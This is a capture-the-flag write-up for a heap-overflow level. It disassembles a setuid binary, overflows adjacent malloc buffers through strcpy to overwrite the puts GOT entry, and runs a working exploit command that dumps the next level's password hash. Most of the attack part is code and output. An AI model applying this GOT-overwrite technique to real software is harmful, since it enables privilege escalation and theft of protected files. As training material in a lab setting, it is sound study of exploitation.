What do we have?

	$ ll
	total 17
	dr-xr-x---+ 1 level7 level7   80 Mar  9  2016 ./
	dr-x--x--x  1 root   root    340 Sep 23  2015 ../
	-rw-r--r--  1 level7 level7  220 Apr  3  2012 .bash_logout
	-rw-r--r--  1 level7 level7 3530 Sep 23  2015 .bashrc
	-rwsr-s---+ 1 level8 users  5648 Mar  9  2016 level7*
	-rw-r--r--+ 1 level7 level7   65 Sep 23  2015 .pass
	-rw-r--r--  1 level7 level7  675 Apr  3  2012 .profile

A `level7` binary.

	$ gdb ./level7
	[...]
	(gdb) b main
	[...]
	(gdb) r
	[...]
	(gdb) disas
	Dump of assembler code for function main:
	0x08048521 <+0>:	push   %ebp
	0x08048522 <+1>:	mov    %esp,%ebp
	=> 0x08048524 <+3>:	and    $0xfffffff0,%esp
	0x08048527 <+6>:	sub    $0x20,%esp
	0x0804852a <+9>:	movl   $0x8,(%esp)
	0x08048531 <+16>:	call   0x80483f0 <malloc@plt>
	0x08048536 <+21>:	mov    %eax,0x1c(%esp)
	0x0804853a <+25>:	mov    0x1c(%esp),%eax
	0x0804853e <+29>:	movl   $0x1,(%eax)
	0x08048544 <+35>:	movl   $0x8,(%esp)
	0x0804854b <+42>:	call   0x80483f0 <malloc@plt>
	0x08048550 <+47>:	mov    %eax,%edx
	0x08048552 <+49>:	mov    0x1c(%esp),%eax
	0x08048556 <+53>:	mov    %edx,0x4(%eax)
	0x08048559 <+56>:	movl   $0x8,(%esp)
	0x08048560 <+63>:	call   0x80483f0 <malloc@plt>
	0x08048565 <+68>:	mov    %eax,0x18(%esp)
	0x08048569 <+72>:	mov    0x18(%esp),%eax
	0x0804856d <+76>:	movl   $0x2,(%eax)
	0x08048573 <+82>:	movl   $0x8,(%esp)
	0x0804857a <+89>:	call   0x80483f0 <malloc@plt>
	0x0804857f <+94>:	mov    %eax,%edx
	0x08048581 <+96>:	mov    0x18(%esp),%eax
	0x08048585 <+100>:	mov    %edx,0x4(%eax)
	0x08048588 <+103>:	mov    0xc(%ebp),%eax
	0x0804858b <+106>:	add    $0x4,%eax
	0x0804858e <+109>:	mov    (%eax),%eax
	0x08048590 <+111>:	mov    %eax,%edx
	0x08048592 <+113>:	mov    0x1c(%esp),%eax
	0x08048596 <+117>:	mov    0x4(%eax),%eax
	0x08048599 <+120>:	mov    %edx,0x4(%esp)
	0x0804859d <+124>:	mov    %eax,(%esp)
	0x080485a0 <+127>:	call   0x80483e0 <strcpy@plt>
	0x080485a5 <+132>:	mov    0xc(%ebp),%eax
	0x080485a8 <+135>:	add    $0x8,%eax
	0x080485ab <+138>:	mov    (%eax),%eax
	0x080485ad <+140>:	mov    %eax,%edx
	0x080485af <+142>:	mov    0x18(%esp),%eax
	0x080485b3 <+146>:	mov    0x4(%eax),%eax
	0x080485b6 <+149>:	mov    %edx,0x4(%esp)
	0x080485ba <+153>:	mov    %eax,(%esp)
	0x080485bd <+156>:	call   0x80483e0 <strcpy@plt>
	0x080485c2 <+161>:	mov    $0x80486e9,%edx
	0x080485c7 <+166>:	mov    $0x80486eb,%eax
	0x080485cc <+171>:	mov    %edx,0x4(%esp)
	0x080485d0 <+175>:	mov    %eax,(%esp)
	0x080485d3 <+178>:	call   0x8048430 <fopen@plt>
	0x080485d8 <+183>:	mov    %eax,0x8(%esp)
	0x080485dc <+187>:	movl   $0x44,0x4(%esp)
	0x080485e4 <+195>:	movl   $0x8049960,(%esp)
	0x080485eb <+202>:	call   0x80483c0 <fgets@plt>
	0x080485f0 <+207>:	movl   $0x8048703,(%esp)
	0x080485f7 <+214>:	call   0x8048400 <puts@plt>
	0x080485fc <+219>:	mov    $0x0,%eax
	0x08048601 <+224>:	leave  
	0x08048602 <+225>:	ret    
	End of assembler dump.

	(gdb) info functions
	All defined functions:

	Non-debugging symbols:
	[...]
	0x080484f4  m
	0x08048521  main
	[...]

	(gdb) disas m
	Dump of assembler code for function m:
	0x080484f4 <+0>:	push   %ebp
	0x080484f5 <+1>:	mov    %esp,%ebp
	0x080484f7 <+3>:	sub    $0x18,%esp
	0x080484fa <+6>:	movl   $0x0,(%esp)
	0x08048501 <+13>:	call   0x80483d0 <time@plt>
	0x08048506 <+18>:	mov    $0x80486e0,%edx
	0x0804850b <+23>:	mov    %eax,0x8(%esp)
	0x0804850f <+27>:	movl   $0x8049960,0x4(%esp)
	0x08048517 <+35>:	mov    %edx,(%esp)
	0x0804851a <+38>:	call   0x80483b0 <printf@plt>
	0x0804851f <+43>:	leave  
	0x08048520 <+44>:	ret    
	End of assembler dump.

Damn. A lot of thing is happening, huh. We'll save ourselves some pain and directly use `Ghidra`, and quickly rewrite a few parts to be more readable.

	char	c[128];

	void	m(void *param_1, int param_2, char *param_3, int param_4, int param_5)
	{
		time_t	tVar1;
		
		tVar1 = time((time_t *)0);
		printf("%s - %d\n", c, tVar1);
		return;
	}

	int	main(int argc, char **argv)
	{
		int *puVar1;
		void *pvVar2;
		int *puVar3;
		FILE *__stream;
		
		puVar1 = (int *)malloc(8);
		*puVar1 = 1;
		pvVar2 = malloc(8);
		puVar1[1] = pvVar2;
		puVar3 = (int *)malloc(8);
		*puVar3 = 2;
		pvVar2 = malloc(8);
		puVar3[1] = pvVar2;
		strcpy((char *)puVar1[1], argv[1]);
		strcpy((char *)puVar3[1], argv[2]);
		__stream = fopen("/home/user/level8/.pass", "r");
		fgets(c, 68, __stream);
		puts("~~");
		return (0);
	}

In short, a lot of obfuscation, 2 `strcpy` with `argv`, a `fopen` followed by `fgets` on a file, and a final `puts`. Function `m` (uncalled) prints the content of the file. We obviously have to trigger a call to `m`, and as `puts` is useless there, it's obvious we'll have to rewrite its GOT entry.

First, let's get the address returned by `malloc`s.

	$ ltrace ./level7
	__libc_start_main(0x8048521, 1, 0xbffff7f4, 0x8048610, 0x8048680 <unfinished ...>
	malloc(8)                                                                             = 0x0804a008
	malloc(8)                                                                             = 0x0804a018
	malloc(8)                                                                             = 0x0804a028
	malloc(8)                                                                             = 0x0804a038
	strcpy(0x0804a018, NULL <unfinished ...>
	--- SIGSEGV (Segmentation fault) ---
	+++ killed by SIGSEGV +++

If we ignore the obfuscation, `puVar1` contains the return of the 2nd `malloc` (`0x0804a018`), and `puVar3` the 4th (`0x0804a038`).

Next, the GOT address of `puts`.

	(gdb) disas 0x8048400
	Dump of assembler code for function puts@plt:
	0x08048400 <+0>:	jmp    *0x8049928
	0x08048406 <+6>:	push   $0x28
	0x0804840b <+11>:	jmp    0x80483a0
	End of assembler dump.

	(gdb) x/x 0x8049928
	0x8049928 <puts@got.plt>:	0x08048406

0x8049928 (`puts`) = 134519080, 0x0804a018 (`puVar1`) = 134520856. 134519080 - 134520856 = -1776. Mh. Our buffer is above the address we want, making a rewrite through buffer overflow impossible... but there is absolutely no way the solution is something else than rewriting the GOT of `puts`, so we focused our attention to the `malloc`s, where we must have mislooked something.

	int		*puVar1;
	void	*pvVar2;
	int		*puVar3;

	puVar1 = (int *)malloc(8);			// We do a malloc of 8 and store its result in puVar1.  
	*puVar1 = 1;						// We store the int 1 at *puVar1 (so puVar1[0]).  
	pvVar2 = malloc(8);					// We do a malloc of 8 and store its result in pvVar2.  
	puVar1[1] = pvVar2;					// We store pvVar2 (a pointer) in puVar1[1].  
	puVar3 = (int *)malloc(8);			// We do a malloc of 8 and store its result in puVar3.  
	*puVar3 = 2;						// We store the int 2 at *puVar3 (so puVar3[0]).  
	pvVar2 = malloc(8);					// We do a malloc of 8 and store its result in pvVar2.  
	puVar3[1] = pvVar2;					// We store pvVar2 (a pointer) in puVar3[1].  
	strcpy((char *)puVar1[1], argv[1]);	// Copy argv[1] from puVar1[1].  
	strcpy((char *)puVar3[1], argv[2]);	// Copy argv[2] from puVar3[1].

After a few hours, we understood better. We have 2 `int *`, and one `void *`. Looking at the addresses returned by the `malloc`s, they are actually next to each other in memory. Meaning, we can overflow the buffer of a `malloc` in the subsequent ones. Also, our 3 variables are pointers. Their values are therefore the addresses they point to. So what if we overflow the first buffer and put the address of the GOT with the first `strcpy`, and overwrite its values with the second?

The `malloc`s are 8 bytes, and we want the second half of `puVar3`. 8 + 8 + (8 / 2) = 20. We'll put 20 fillers (`Aa0Aa1Aa2Aa3Aa4Aa5Aa`), followed by the GOT address (`0x8049928` => `\x28\x99\x04\x08`) in the `argv[1]` to make the pointer point to GOT, and the address of `m` (`0x080484f4` => `\xf4\x84\x04\x08`) in `argv[2]`, so that the value of the GOT address is overwrote by `strcpy` during its dereferencing.

	$ ./level7 $'Aa0Aa1Aa2Aa3Aa4Aa5Aa\x28\x99\x04\x08' $'\xf4\x84\x04\x08'
	5684af5cb4c8679958be4abe6373147ab52d95768e047820bf382e44fa8d8fb9
	 - 1761040511
